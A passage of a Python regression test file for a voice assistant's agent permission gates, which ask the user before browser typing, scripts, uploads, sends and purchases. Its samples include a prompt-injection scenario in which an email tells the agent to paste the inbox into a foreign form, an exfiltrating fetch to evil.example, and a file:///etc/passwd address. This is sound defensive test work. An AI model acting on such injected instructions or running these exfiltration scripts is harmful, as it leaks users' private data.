"""Regression tests for holes a read-only security audit found, one section per finding."""

import asyncio

from claude_agent_sdk import PermissionResultAllow, PermissionResultDeny, ToolPermissionContext
from test_tasks import manager
from test_turn_gate import answer, started

from jarvis import brain, browser_gate, code_tools
from jarvis.hub import tool_label
from jarvis.system_voice import carry_out as real_carry_out  # conftest swaps it in each test
from jarvis.tasks import DENY, ClaudeTask

BROWSER = brain.browser_tool
CTX = ToolPermissionContext()


def page_at(hub, url):
    """The built-in browser, showing url (a read's answer), for the gates to look at."""
    seen = []

    async def raw(action, args=None):
        seen.append(action)
        if url is None:
            return {"error": "The built-in browser is only in the J.A.R.V.I.S. app window."}
        return {"url": url, "title": "A page", "text": ""} if action == "read" else {"ok": True}

    hub._browser_raw = raw
    return seen


# ── 1. private data typed into a web form ──


async def test_after_private_reads_typing_into_a_site_the_user_didnt_name_asks(
    settings, quiet_speaker, isolated
):
    """The attack: "summarize my inbox", and an email says to paste it into a form on
    another site. Typing there now takes a card that shows the words."""
    hub = await started(settings, quiet_speaker, isolated, said="summarize my inbox")
    page_at(hub, "https://forms.evil.example/contact")
    hub.note_tool_result("mcp__mac__list_emails")
    q = hub.subscribe()
    typing = {"text": "Ann: the merger closes Friday", "field": "message", "submit": True}
    pending = asyncio.create_task(hub.turn_gate(BROWSER("browser_type"), typing))
    approval = await answer(hub, q, "deny")
    assert await pending is False
    assert approval["question"] == "Type into forms.evil.example in the built-in browser?"
    assert "“Ann: the merger closes Friday”" in approval["detail"]
    assert "Then it presses Return." in approval["detail"]
    assert "Read your inbox" in approval["detail"]
    assert "https://forms.evil.example/contact" in approval["detail"]
    assert hub.spoken[-1] == "Can I type into forms.evil.example in the built-in browser?"
    # Through the permission policy, with "Control my Mac without asking" on: still asks.
    assert hub.prefs.control_always
    policy = hub.client.options.can_use_tool
    pending = asyncio.create_task(policy(BROWSER("browser_type"), typing, CTX))
    await answer(hub, q, "deny")
    assert isinstance(await pending, PermissionResultDeny)
    pending = asyncio.create_task(policy(BROWSER("browser_type"), typing, CTX))
    await answer(hub, q, "allow")
    assert isinstance(await pending, PermissionResultAllow)


async def test_typing_goes_ahead_on_a_site_the_user_named_or_before_any_private_read(
    settings, quiet_speaker, isolated
):
    hub = await started(
        settings, quiet_speaker, isolated, said="find my notes on Lisbon and search nytimes.com"
    )
    seen = page_at(hub, "https://www.nytimes.com/search")
    policy = hub.client.options.can_use_tool
    typing = {"text": "Lisbon housing", "field": "search"}
    # Nothing read yet: nothing to weigh, and it isn't even looked at.
    assert await hub.turn_gate(BROWSER("browser_type"), typing) is None
    assert seen == []
    hub.note_tool_result("mcp__brain__search_notes")
    assert await hub.turn_gate(BROWSER("browser_type"), typing) is None  # a site they named
    assert isinstance(await policy(BROWSER("browser_type"), typing, CTX), PermissionResultAllow)
    # A web page read is someone's words, not the user's secrets: browsing goes on.
    hub._rid, hub._turn_text = "r2", "look up ramen places"
    await hub.reset()
    hub._rid = "r2"
    page_at(hub, "https://tabelog.example/tokyo")
    hub.note_tool_result("WebFetch")
    assert await hub.turn_gate(BROWSER("browser_click"), {"text": "Next"}) is None
    assert not hub.approvals


async def test_every_browser_tool_but_the_looking_ones_is_gated_new_ones_included(
    settings, quiet_speaker, isolated
):
    """Gated by "not in the read-only set", not by a list: the tools another track adds
    (act by ref, tabs, scripts, uploads, dialogs) are weighed like typing and clicking."""
    looking = [
        "browser_read",
        "browser_screenshot",
        "browser_snapshot",
        "browser_wait",
        "browser_console",
        "browser_network",
        "browser_scroll",
        "browser_back",
    ]
    assert set(looking) == brain.BROWSER_LOOKING
    for name in looking:
        assert not brain.browser_acting(BROWSER(name)), name
        assert brain.result_kind(BROWSER(name)) == "web", name
    for name in ("browser_click", "browser_type", "browser_act", "browser_tabs", "browser_eval",
                 "browser_upload", "browser_dialog", "browser_whatever_comes_next"):  # fmt: skip
        assert brain.browser_acting(BROWSER(name)), name
        assert brain.result_kind(BROWSER(name)) == "web", name  # pages, not the user's data
    assert not brain.browser_acting("mcp__research__research_search")  # the Research Center
    assert not brain.browser_acting(f"mcp__{code_tools.BROWSER}__browser_type")
    hub = await started(settings, quiet_speaker, isolated, said="book me a table")
    options = hub.client.options
    assert {BROWSER(n) for n in looking} <= set(options.allowed_tools)
    assert not any(brain.browser_acting(t) for t in options.allowed_tools)
    assert "mcp__research" in options.allowed_tools  # its tools run as before, unweighed
    page_at(hub, "https://resy.example/venue")
    policy = options.can_use_tool
    act = {"ref": "e12", "action": "click"}
    # A tool the policy never heard of is operated like a click, not refused.
    assert isinstance(await policy(BROWSER("browser_act"), act, CTX), PermissionResultAllow)
    hub.note_tool_result("mcp__mac__list_events")  # the calendar is private
    q = hub.subscribe()
    pending = asyncio.create_task(policy(BROWSER("browser_act"), act, CTX))
    approval = await answer(hub, q, "deny")
    assert isinstance(await pending, PermissionResultDeny)
    assert approval["question"] == "Use resy.example in the built-in browser?"
    assert "Checked your calendar" in approval["detail"]


async def test_with_control_off_the_mouse_and_keyboard_ok_still_covers_acting_tools(
    settings, quiet_speaker, isolated
):
    hub = await started(settings, quiet_speaker, isolated, said="fill in the form")
    hub.set_prefs({"control_always": False})
    page_at(hub, "https://example.org/form")
    policy = hub.client.options.can_use_tool
    q = hub.subscribe()
    pending = asyncio.create_task(policy(BROWSER("browser_act"), {"ref": "e1"}, CTX))
    approval = await answer(hub, q, "allow")
    assert await pending == PermissionResultAllow()
    assert approval["question"] == "Let me use your mouse and keyboard for this request?"
    # One OK covers the rest of the request, for every acting tool.
    assert isinstance(
        await policy(BROWSER("browser_type"), {"text": "x"}, CTX), PermissionResultAllow
    )


async def test_a_press_that_carries_nothing_asks_once_per_site_per_request(
    settings, quiet_speaker, isolated
):
    hub = await started(settings, quiet_speaker, isolated, said="check my texts, then book it")
    page_at(hub, "https://opentable.example/r/nopa")
    hub.note_tool_result("mcp__messages__read_texts")
    q = hub.subscribe()
    pending = asyncio.create_task(hub.turn_gate(BROWSER("browser_click"), {"text": "7:30 PM"}))
    approval = await answer(hub, q, "allow")
    assert await pending is True
    assert approval["question"] == "Use opentable.example in the built-in browser?"
    assert "Press “7:30 PM”" in approval["detail"]
    assert await hub.turn_gate(BROWSER("browser_click"), {"text": "Continue"}) is None
    # Typing there still shows its words each time.
    pending = asyncio.create_task(hub.turn_gate(BROWSER("browser_type"), {"text": "Ann Lee"}))
    approval = await answer(hub, q, "deny")
    assert await pending is False and "“Ann Lee”" in approval["detail"]
    # The next request starts over.
    hub._rid = "r2"
    pending = asyncio.create_task(hub.turn_gate(BROWSER("browser_click"), {"text": "Back"}))
    await answer(hub, q, "deny")
    assert await pending is False


async def test_opening_a_site_after_private_reads_covers_presses_there_not_typing(
    settings, quiet_speaker, isolated
):
    hub = await started(settings, quiet_speaker, isolated, said="read Ann's email, then book it")
    page_at(hub, "https://opentable.example/r/nopa")
    hub.note_tool_result("mcp__mac__list_emails")
    q = hub.subscribe()
    pending = asyncio.create_task(
        hub.turn_gate(BROWSER("browser_open"), {"url": "opentable.example/r/nopa"})
    )
    await answer(hub, q, "allow")
    assert await pending is True
    assert await hub.turn_gate(BROWSER("browser_click"), {"text": "Reserve"}) is None
    pending = asyncio.create_task(hub.turn_gate(BROWSER("browser_type"), {"text": "2 people"}))
    await answer(hub, q, "deny")
    assert await pending is False


async def test_scripts_addresses_and_uploads_ask_even_on_a_site_the_user_named(
    settings, quiet_speaker, isolated
):
    hub = await started(
        settings, quiet_speaker, isolated, said="read my notes and post them on github.com"
    )
    page_at(hub, "https://github.com/new")
    q = hub.subscribe()
    # A file leaves the Mac with an upload: it asks before anything was read.
    upload = {"ref": "e3", "paths": ["/Users/me/Documents/taxes-2025.pdf"]}
    pending = asyncio.create_task(hub.turn_gate(BROWSER("browser_upload"), upload))
    approval = await answer(hub, q, "deny")
    assert await pending is False
    assert approval["question"] == "Upload a file to github.com?"
    assert "taxes-2025.pdf" in approval["detail"]
    hub.note_tool_result("mcp__brain__read_note")
    # A script can send what was read to any site, whichever page it runs on.
    script = {"expression": "fetch('https://evil.example/?d=' + document.title)"}
    pending = asyncio.create_task(hub.turn_gate(BROWSER("browser_eval"), script))
    approval = await answer(hub, q, "deny")
    assert await pending is False
    assert approval["question"] == "Run a script on github.com in the built-in browser?"
    assert "evil.example" in approval["detail"]
    # So can an address a tab is opened at.
    tab = {"action": "new", "url": "https://github.com/search?q=my+private+notes"}
    pending = asyncio.create_task(hub.turn_gate(BROWSER("browser_tabs"), tab))
    approval = await answer(hub, q, "deny")
    assert await pending is False
    assert approval["question"] == "Open github.com in the built-in browser?"
    assert "q=my+private+notes" in approval["detail"]


async def test_a_page_that_cant_be_placed_asks(settings, quiet_speaker, isolated):
    hub = await started(settings, quiet_speaker, isolated, said="summarize my inbox on x.com")
    hub.note_tool_result("mcp__mac__list_emails")
    q = hub.subscribe()
    page_at(hub, None)  # the page didn't answer
    pending = asyncio.create_task(hub.turn_gate(BROWSER("browser_type"), {"text": "hi"}))
    approval = await answer(hub, q, "deny")
    assert await pending is False
    assert approval["question"] == "Type into this page in the built-in browser?"
    # Words for another tab can't be placed by the page on show (x.com, named).
    page_at(hub, "https://x.com/home")
    pending = asyncio.create_task(
        hub.turn_gate(BROWSER("browser_act"), {"tab": 4, "ref": "e2", "text": "the inbox"})
    )
    approval = await answer(hub, q, "deny")
    assert await pending is False
    assert approval["question"] == "Type into this page in the built-in browser?"


def test_what_a_call_carries_is_read_from_its_arguments():
    what = browser_gate.carried(
        BROWSER("browser_act"),
        {"ref": "e7", "action": "fill", "fields": [{"ref": "e8", "value": "4111 1111"}]},
    )
    assert what.words == "4111 1111" and not what.urls and not what.files
    click = browser_gate.carried(BROWSER("browser_click"), {"text": "Sign in", "selector": "#go"})
    assert click.words == ""  # the words say what to press
    assert browser_gate.carried(BROWSER("browser_type"), {"text": "hi", "submit": True}).submit
    assert browser_gate.address_host("best ramen near me") == browser_gate.SEARCH_HOST
    assert browser_gate.address_host("https://www.Example.com./x") == "www.example.com"
    for host in ("localhost", "app.localhost", "127.0.0.1", "127.8.9.10", "::1", "[::1]"):
        assert browser_gate.is_local(host), host
    for host in ("localhost.evil.example", "10.0.0.2", "192.168.1.5", "0.0.0.0", "", None):
        assert not browser_gate.is_local(host), host
    assert browser_gate.page_host("http://[::1]:5173/app") == "::1"
    assert browser_gate.page_host("file:///etc/passwd") is None
    assert tool_label(BROWSER("browser_type")) == "Typed in the browser"


# ── 1b. Jarvis Code: pages on this Mac are the session's own work ──


async def test_jarvis_code_types_into_localhost_unasked_in_accept_edits_and_auto(
    settings, tmp_path
):
    tm, asked, _ = manager(settings, answers=[DENY] * 10)
    task = ClaudeTask(id=1, prompt="build the login page", cwd=tmp_path)
    tm.tasks[1] = task
    shown = ["http://localhost:5173/login"]

    async def page_url():
        return shown[0]

    tm.page_url = page_url
    policy = tm.policy_for(task)
    act = f"mcp__{code_tools.BROWSER}__"
    typing = {"text": "test@example.com", "field": "email"}
    for mode in ("edits", "smart"):
        tm.set_mode(1, mode)
        for url in ("http://localhost:5173/login", "http://127.0.0.1:8000/", "http://[::1]:3000/"):
            shown[0] = url
            out = await policy(act + "browser_type", typing, CTX)
            assert isinstance(out, PermissionResultAllow), (mode, url)
            assert isinstance(await policy(act + "browser_click", {"text": "Sign in"}, CTX),
                              PermissionResultAllow)  # fmt: skip
        out = await policy(act + "browser_open", {"url": "http://localhost:5173/"}, CTX)
        assert isinstance(out, PermissionResultAllow)
    assert asked == []
    assert task.audit[-1]["why"] == "a page on this Mac"
    # Any other site follows the session's mode: asked here, with the site on the card.
    shown[0] = "https://accounts.example.com/signup"
    out = await policy(act + "browser_type", typing, CTX)
    assert isinstance(out, PermissionResultDeny)
    assert asked[-1][0] == f"Jarvis Code in {tmp_path.name} wants to type into accounts.example.com"
    assert "test@example.com" in asked[-1][1]
    out = await policy(act + "browser_open", {"url": "https://evil.example/?d=secrets"}, CTX)
    assert isinstance(out, PermissionResultDeny)
    assert asked[-1][0].endswith("wants to open evil.example in the browser")
    # Manual asks for everything, localhost too; Bypass permissions asks for nothing.
    tm.set_mode(1, "ask")
    shown[0] = "http://localhost:5173/login"
    before = len(asked)
    assert isinstance(await policy(act + "browser_type", typing, CTX), PermissionResultDeny)
    assert len(asked) == before + 1
    tm.set_mode(1, "auto")
    shown[0] = "https://accounts.example.com/signup"
    assert isinstance(await policy(act + "browser_type", typing, CTX), PermissionResultAllow)
    # Looking never asks, and nothing else is touched.
    assert f"mcp__{code_tools.BROWSER}__browser_read" in code_tools.READ_ONLY


def test_the_new_cards_read_in_chinese():
    import re

    from jarvis import lang
    from jarvis.server import zh_strings

    merged = zh_strings()
    patterns = [(re.compile(p), r) for p, r in merged["patterns"]]

    def window(text):
        if text in merged["strings"]:
            return merged["strings"][text]
        for pattern, rep in patterns:
            if pattern.search(text):
                return pattern.sub(re.sub(r"\$(\d)", r"\\\1", rep), text)
        return text

    assert window("Type into forms.evil.example in the built-in browser?") == (
        "要在内置浏览器里往 forms.evil.example 输入内容吗？"
    )
    assert (
        window("Type into this page in the built-in browser?")
        == "要在内置浏览器里往这个页面输入内容吗？"
    )
    assert window("Upload a file to github.com?") == "要把文件上传到 github.com 吗？"
    assert window("Jarvis Code in web wants to click on example.com") == (
        "web 中的 Jarvis Code 想在 example.com 上点按"
    )
    assert lang.translate("Can I type into x.com in the built-in browser?") == (
        "我可以在内置浏览器里往 x.com 输入内容吗？"
    )
    said = lang.translate("Can I use this page in the built-in browser?")
    assert said.replace(" ", "") == "我可以在内置浏览器里操作这个页面吗？"
    assert lang.translate("Jarvis Code in web wants to type into x.com") == (
        "web 中的 Jarvis Code 想要在 x.com 里输入内容"
    )


# ── 2. the Mac's mouse and keyboard: never a purchase, and a send asks ──

SLACK = {
    "trusted": True,
    "app": "Slack",
    "bundle": "com.tinyspeck.slackmacgap",
    "window": "Ann Lee (DM) - BSH Ventures - Slack",
    "focused": {"role": "AXTextArea", "value": "The Q3 numbers are attached", "editable": True},
}


class Hands:
    """A HandsGuard with the Mac faked: what the helper would report, what the turn has
    read, what the user asked for, and the cards it put up."""

    def __init__(self, scene=None, reads=(), asked=(), words="", answer=False):
        from jarvis import hands_guard

        self.scene, self.cards, self.probed = dict(scene or {}), [], []
        self.answer = answer
        self.reads = {"private": "private" in reads, "web": "web" in reads, "what": list(reads)}

        async def probe(*argv):
            self.probed.append(argv)
            return dict(self.scene)

        async def send(question, detail, spoken, choices):
            self.cards.append({"question": question, "detail": detail, "spoken": spoken,
                               "choices": choices})  # fmt: skip
            return self.answer

        self.guard = hands_guard.HandsGuard(
            reads=lambda: self.reads,
            words=lambda: words,
            asked=lambda kind: kind in asked,
            send=send,
            probe=probe,
        )


def test_what_buys_and_what_sends_by_its_words():
    from jarvis.hands_guard import purchase_word, send_kind

    for label in ("Buy", "Buy Now", "Pay", "Place order", "Book", "Subscribe",
                  "Confirm purchase", "Transfer", "Send money", "立即支付", "提交订单", "预订",
                  "转账", "$4.99", "Buy for $4.99", "Plаce оrder", "P1ace 0rder"):  # fmt: skip
        assert purchase_word([label]) == label, label
    for label in ("Send", "Save", "Continue", "Add to cart", "Get", "Reply", "Page 2", ""):
        assert purchase_word([label]) is None, label
    assert send_kind(["Send"]) == send_kind(["send later"]) == send_kind(["发送"]) == "send"
    assert send_kind(["Delete for Everyone"]) == send_kind(["撤回"]) == "delete"
    assert send_kind(["Post"]) == "post" and send_kind(["Publish"]) == "publish"
    assert send_kind(["Submit"]) == "submit"
    for label in ("Sender", "Sent", "Reply", "Forward", "Archive", "Search"):
        assert send_kind([label]) is None, label


async def test_a_purchase_button_outside_the_built_in_browser_is_refused():
    hands = Hands({"trusted": True, "app": "App Store", "bundle": "com.apple.AppStore"})
    why = await hands.guard.press(["buy now"], app="App Store")
    assert "built-in browser" in why and hands.probed == []  # refused before looking further
    hands.scene = {**hands.scene, "at_app": "App Store", "press": {"role": "AXButton",
                   "title": "", "description": "$4.99"}}  # fmt: skip
    assert "“$4.99” buys" in await hands.guard.click(640, 300)
    # The user's own instant command hears it said to them, not to Claude.
    own = await hands.guard.press(["place order"], said="click place order")
    assert own.endswith("so press this one yourself.")
    assert hands.cards == []


async def test_a_send_in_a_messaging_app_shows_its_card_unless_the_user_asked():
    hands = Hands(SLACK)
    why = await hands.guard.press(["send now"], app="Slack")
    assert why.startswith("The user said no")
    [card] = hands.cards
    assert card["question"] == "Send this in Slack?"
    assert "Ann Lee (DM) - BSH Ventures - Slack" in card["detail"]
    assert "The Q3 numbers are attached" in card["detail"]
    assert card["spoken"].endswith("Do you want it sent?") and card["choices"] == (
        "Send",
        "Don't send",
    )
    hands.answer = True
    assert await hands.guard.press(["send now"]) is None  # a yes: it goes
    # Asked for in so many words, with nothing read: no card.
    asked = Hands(SLACK, asked=("send",))
    assert await asked.guard.press(["send now"]) is None and asked.cards == []
    # Other buttons in the app are nobody's business.
    assert await Hands(SLACK).guard.press(["mark as unread"]) is None


async def test_after_a_read_even_an_asked_send_asks_unless_they_named_the_conversation():
    web = Hands(SLACK, reads=("web",), asked=("send",), words="reply to ann saying yes")
    await web.guard.press(["send"])
    assert len(web.cards) == 1 and "didn't name this conversation" in web.cards[0]["detail"]
    named = Hands(SLACK, reads=("private",), asked=("send",), words="send ann lee the numbers")
    assert await named.guard.press(["send"]) is None and named.cards == []


async def test_return_and_newlines_in_a_message_box_send():
    hands = Hands({**SLACK, "window": "general | BSH - Slack"})
    assert await hands.guard.keys("cmd+t") is None and hands.probed == []  # nothing to check
    assert await hands.guard.typing("no line breaks here") is None and hands.probed == []
    assert (await hands.guard.keys("return")).startswith("The user said no")
    assert hands.cards[-1]["question"] == "Send this in Slack?"
    assert "Key: return" in hands.cards[-1]["detail"]
    await hands.guard.typing("see you there\n")
    assert "see you there" in hands.cards[-1]["detail"]
    # Mail: Return is a new line; ⌘⇧D sends. The Delete key deletes a selected message.
    mail = Hands({"trusted": True, "app": "Mail", "bundle": "com.apple.mail", "window": "Re: Lunch",
                  "focused": {"role": "AXTextArea", "value": "Sounds good", "editable": True}})  # fmt: skip
    assert await mail.guard.keys("return") is None
    assert await mail.guard.typing("line one\nline two") is None
    await mail.guard.keys("cmd+shift+d")
    assert mail.cards[-1]["question"] == "Send this in Mail?"
    assert await mail.guard.keys("delete") is None  # a character, in the message box
    mail.scene["focused"] = {"role": "AXTable", "title": "Messages"}
    await mail.guard.keys("delete")
    assert mail.cards[-1]["question"] == "Delete this in Mail?"
    assert mail.cards[-1]["choices"] == ("Delete", "Don't delete")


async def test_without_the_helper_a_messaging_app_asks_for_any_click():
    hands = Hands({"app": "Messages", "bundle": "com.apple.MobileSMS", "fallback": True})
    await hands.guard.click(100, 200)
    assert hands.cards[-1]["question"] == "Send this in Messages?"
    finder = Hands({"app": "Finder", "bundle": "com.apple.finder", "fallback": True})
    assert await finder.guard.click(100, 200) is None and finder.cards == []
    # A web app in a browser counts by its tab's title.
    gmail = Hands({"trusted": True, "app": "Safari", "bundle": "com.apple.Safari",
                   "window": "Inbox (3) - ann@example.com - Gmail"})  # fmt: skip
    await gmail.guard.press(["Send"])
    assert gmail.cards[-1]["question"] == "Send this in Gmail?"


def test_a_conversation_is_named_only_in_full():
    from jarvis.hands_guard import conversation_named

    title = "Ann Lee (DM) - BSH Ventures - Slack"
    assert conversation_named(title, "reply to Ann Lee saying yes")
    assert not conversation_named(title, "reply to Ann saying yes")
    assert not conversation_named("Ann Evans", "reply to Ann saying yes")
    assert conversation_named("general | BSH - Slack", "post it in general")
    assert conversation_named("王小明", "回复王小明说好的")
    assert not conversation_named("", "anything")


async def test_computer_tools_check_before_they_press(monkeypatch):
    """press_button finds first and presses only a control named exactly what was checked
    ("Place" must not become "Place order"); click, keys and typing go past the guard."""
    import json

    from jarvis import computer

    hands = Hands(SLACK, asked=())
    calls, mouse, keys, typed = [], [], [], []
    found = {"found": True, "name": "place order", "labels": ["place order"], "app": "Amazon"}

    async def run(*cmd, **_k):
        calls.append(cmd)
        return json.dumps(found)

    monkeypatch.setattr(computer, "run_command", run)
    monkeypatch.setattr(computer, "SETTLE", 0)
    monkeypatch.setattr(computer, "_post_mouse", lambda *a: mouse.append(a))
    monkeypatch.setattr(computer, "_post_keys", keys.append)
    monkeypatch.setattr(computer, "_post_text", typed.append)
    monkeypatch.setattr(computer, "create_sdk_mcp_server", lambda **k: k["tools"])
    tools = {t.name: t.handler for t in computer.build_server(computer.Screen(), hands.guard)}
    out = await tools["press_button"]({"name": "Place"})
    assert out.get("is_error") and "built-in browser" in out["content"][0]["text"]
    assert [c[-2:] for c in calls] == [("Place", "find")]  # never pressed
    found.update(name="save", labels=["save"], app="TextEdit")
    hands.scene = {"trusted": True, "app": "TextEdit", "bundle": "com.apple.TextEdit"}
    await tools["press_button"]({"name": "Sav"})
    assert calls[-1][-3:] == ("save", "click", "exact")  # exactly the one it checked
    hands.scene = SLACK
    out = await tools["press_keys"]({"keys": "return"})
    assert out.get("is_error") and keys == []
    out = await tools["type_text"]({"text": "the numbers\n"})
    assert out.get("is_error") and typed == []
    await tools["type_text"]({"text": "the numbers"})
    assert typed == ["the numbers"]
    hands.scene = {**SLACK, "at_app": "Slack", "at_bundle": "com.tinyspeck.slackmacgap",
                   "press": {"role": "AXButton", "description": "Send now"}}  # fmt: skip
    out = await tools["click"]({"x": 10, "y": 10})
    assert out.get("is_error") and mouse == []
    await tools["click"]({"x": 10, "y": 10, "button": "right"})  # a menu, not a press
    assert len(mouse) == 1


async def test_instant_commands_are_the_users_words_but_still_checked():
    import json

    from test_system_voice import Fake

    from jarvis import system_voice
    from jarvis.system_voice import Command

    assert system_voice.carry_out is not real_carry_out  # conftest's stand-in elsewhere
    clean = Hands(SLACK)
    mac = Fake(
        click=json.dumps({"found": True, "name": "send", "labels": ["send"], "app": "Slack"})
    )
    said = Command("click", "send", {"how": "click"})
    assert await real_carry_out(said, mac.run, mac, free=True, guard=clean.guard) == "Done."
    assert clean.cards == [] and mac.ran[-1][-3:] == ("send", "click", "exact")
    # Once the conversation has read something, "click send" still shows the card.
    read = Hands(SLACK, reads=("web",))
    mac = Fake(click=json.dumps({"found": True, "name": "send", "app": "Slack"}))
    assert await real_carry_out(said, mac.run, mac, free=True, guard=read.guard) == (
        "Okay, I left it."
    )
    assert read.cards[-1]["question"] == "Send this in Slack?"
    assert [r[-1] for r in mac.ran] == ["find"]  # found, never pressed
    # A purchase, whatever was said and however free the hands are.
    mac = Fake(click=json.dumps({"found": True, "name": "buy now", "app": "App Store"}))
    reply = await real_carry_out(
        Command("click", "buy now", {"how": "click"}), mac.run, mac, free=True, guard=clean.guard
    )
    assert reply.endswith("so press this one yourself.") and not mac.mouse
    # "Click" where the pointer is doesn't say it's a send.
    pointed = Hands({**SLACK, "at_app": "Slack", "at_bundle": "com.tinyspeck.slackmacgap",
                     "press": {"role": "AXButton", "description": "Send"}})  # fmt: skip
    mac = Fake()
    reply = await real_carry_out(Command("point", "click"), mac.run, mac, True, pointed.guard)
    assert reply == "Okay, I left it." and not mac.mouse
    # "Press return" in a chat is asked for; after a read it shows the card.
    keyed = Hands(SLACK, reads=("private",))
    mac = Fake()
    reply = await real_carry_out(Command("keys", "return", {"name": "return"}), mac.run, mac,
                                 True, keyed.guard)  # fmt: skip
    assert reply == "Okay, I left it." and mac.keys == []


async def test_a_risky_button_found_by_part_of_its_name_is_never_pressed_first():
    """The old path pressed first and checked the name after: "click sen" with control off
    pressed Send, then said it was the user's to press."""
    import json

    from test_system_voice import Fake

    from jarvis.system_voice import Command

    mac = Fake(click=json.dumps({"found": True, "name": "send", "app": "Messages"}))
    reply = await real_carry_out(Command("click", "sen", {"how": "click"}), mac.run, mac)
    assert reply == "“send” is one I leave for you to press."
    assert [r[-1] for r in mac.ran] == ["find"]


async def test_the_hub_puts_the_guard_in_front_of_its_hands(
    settings, quiet_speaker, isolated, monkeypatch
):
    from jarvis import computer, lang, system_voice

    guards = []
    real = computer.build_server

    def build_server(screen, guard=None):
        guards.append(guard)
        return real(screen, guard)

    monkeypatch.setattr(computer, "build_server", build_server)
    hub = await started(settings, quiet_speaker, isolated, said="open slack")
    assert guards == [hub.hands_guard]  # the brain's computer tools get it
    seen = {}

    async def carry_out(command, **kwargs):
        seen.update(kwargs)
        return "Done."

    monkeypatch.setattr(system_voice, "carry_out", carry_out)
    assert await hub._instant_system("r1", "press return")
    assert seen["guard"] is hub.hands_guard
    assert hub.hands_guard.probe.enabled is False  # tests never look at the real Mac
    hub._turn_text = "reply to Ann saying I'm in and send it"
    assert hub._user_asked_for("hands_send")
    hub._turn_text = "what did Ann say?"
    assert not hub._user_asked_for("hands_send")
    hub.set_prefs({"language": "zh"})
    hub._turn_text = "回复安说我到了，然后发送"
    assert hub._user_asked_for("hands_send")
    hub._turn_text = "消息发送了吗"
    assert not hub._user_asked_for("hands_send")
    assert lang.translate("Send this in Slack?") == "要在 Slack 里发送这个吗？"


# ── 3. the address bar: ports, local addresses, and never a script ──


def _url_cases():
    import json
    from pathlib import Path

    fixture = Path(__file__).parent / "fixtures" / "url_input.json"
    return [c for c in json.loads(fixture.read_text())["cases"] if not c[1]]


def test_browser_address_reads_addresses_as_the_window_does():
    """brain.browser_address and app/url-input.js agree on every case JARVIS could ask
    for (tests/web/urlinput.test.mjs runs the same cases against the window's side)."""
    cases = _url_cases()
    assert len(cases) > 30
    for text, _typed, expected in cases:
        assert brain.browser_address(text) == expected, text
    assert brain.browser_address("\u3000localhost:3000\ufeff") == "http://localhost:3000"
    assert brain.browser_address("example.com/a b") is None  # a space: words, as in the window


async def test_a_local_page_is_a_page_to_the_turn_gate_too(settings, quiet_speaker, isolated):
    hub = await started(settings, quiet_speaker, isolated, said="read my notes")
    hub.note_tool_result("mcp__brain__read_note")
    q = hub.subscribe()
    pending = asyncio.create_task(
        hub.turn_gate(BROWSER("browser_open"), {"url": "192.168.1.20:8080/upload?d=notes"})
    )
    approval = await answer(hub, q, "deny")
    assert await pending is False
    assert approval["question"] == "Open 192.168.1.20 in the built-in browser?"
    assert "http://192.168.1.20:8080/upload?d=notes" in approval["detail"]
    # A script or data address is only ever searched for: nothing opens.
    assert await hub.turn_gate(BROWSER("browser_open"), {"url": "javascript:alert(1)"}) is True


async def test_jarvis_code_opens_its_dev_server_by_host_and_port():
    open_tool = f"mcp__{code_tools.BROWSER}__browser_open"
    for url in ("localhost:5173", "127.0.0.1:8000/admin", "[::1]:3000"):
        target = await browser_gate.target(open_tool, {"url": url}, None)
        assert target.local, url
    remote = await browser_gate.target(open_tool, {"url": "example.com:8443"}, None)
    assert not remote.local and remote.verb == "open example.com in the browser"


# ── 4. meeting prep reaches tomorrow's meetings ──


async def test_meeting_prep_looks_thirty_hours_ahead_and_the_watcher_still_four(
    settings, quiet_speaker, isolated, monkeypatch
):
    import time
    from datetime import datetime, timedelta

    from jarvis import calendar_kit
    from jarvis import hub as hub_module

    now = datetime.now().replace(second=0, microsecond=0)
    tomorrow = now + timedelta(hours=20)
    looks = []

    async def fetch(back=0, ahead=24, timeout=70):
        looks.append((back, ahead))
        return {
            "events": [
                {
                    "id": "e1",
                    "title": "Board review",
                    "begin": tomorrow.isoformat(),
                    "end": (tomorrow + timedelta(hours=1)).isoformat(),
                    "attendees": ["Priya Raman", "tom.ellis@example.com"],
                    "all_day": False,
                    "location": "",
                }
            ]
        }

    monkeypatch.setattr(calendar_kit, "fetch", fetch)
    own = {k: v for k, v in isolated.items() if k != "suggester"}  # the hub's own suggester
    hub = hub_module.Hub(
        settings, client_factory=lambda **k: None, speaker=quiet_speaker, poll=False, **own
    )
    assert hub.suggester._events == hub._prep_events
    assert hub.watcher._events_fn == hub._upcoming_events
    [prep] = await hub.suggester._preps(now)
    assert prep.title == "Prep for Board review" and "Priya Raman" in prep.text
    assert looks == [(0, 30)]
    await hub._prep_events()  # within ten minutes: the same look
    assert looks == [(0, 30)]
    hub._prep_cache = (time.monotonic() - hub_module.PREP_EVENTS_SECONDS - 1, [])
    await hub._prep_events()
    assert looks == [(0, 30), (0, 30)]
    await hub._upcoming_events()  # the watcher's look is still four hours
    assert looks[-1] == (0, 4)
    # Tomorrow's people are speech hints too.
    await hub._seed_hearing_names()
    assert {"Priya Raman", "tom.ellis"} <= set(hub.hearing.seeds["calendar"])


# ── 5. Chinese: the screen and the instant Mac commands ──

SYSTEM_ZH = [
    ("新标签页", "keys", "cmd+t"),
    ("请帮我关闭这个标签页", "keys", "cmd+w"),
    ("截个图", "keys", "cmd+shift+3"),
    ("锁屏", "keys", "ctrl+cmd+q"),
    ("下一页", "keys", "pagedown"),
    ("按回车", "keys", "return"),
    ("按一下回车键", "keys", "return"),
    ("按下命令加T", "keys", "cmd+t"),
    ("按 command 加 shift 加 t", "keys", "cmd+shift+t"),
    ("按命令加一", "keys", "cmd+1"),
    ("按退出键", "keys", "escape"),
    ("向下滚动", "scroll", "down"),
    ("往上滚一点", "scroll", "up"),
    ("向右滚动", "scroll", "right"),
    ("调大音量", "volume", "up"),
    ("声音小一点", "volume", "down"),
    ("静音", "volume", "mute"),
    ("取消静音", "volume", "unmute"),
    ("把音量调到百分之五十", "volume", "set"),
    ("点击这里", "point", "click"),
    ("双击", "point", "double click"),
    ("右键", "point", "right click"),
    ("点击保存", "click", "保存"),
    ("点一下发送按钮", "click", "发送"),
    ("右键点击桌面", "click", "桌面"),
    ("输入你好，世界", "type", "你好，世界"),
    ("打开微信", "open", "WeChat"),
    ("打开备忘录应用", "open", "Notes"),
    ("启动网易云音乐", "open", "网易云音乐"),
    ("切换到邮件", "focus", "Mail"),
    ("退出音乐", "quit", "Music"),
    ("隐藏访达", "hide", "Finder"),
    ("调度中心", "mission", ""),
]


def test_the_instant_mac_commands_in_chinese():
    from jarvis import lang

    for said, kind, arg in SYSTEM_ZH:
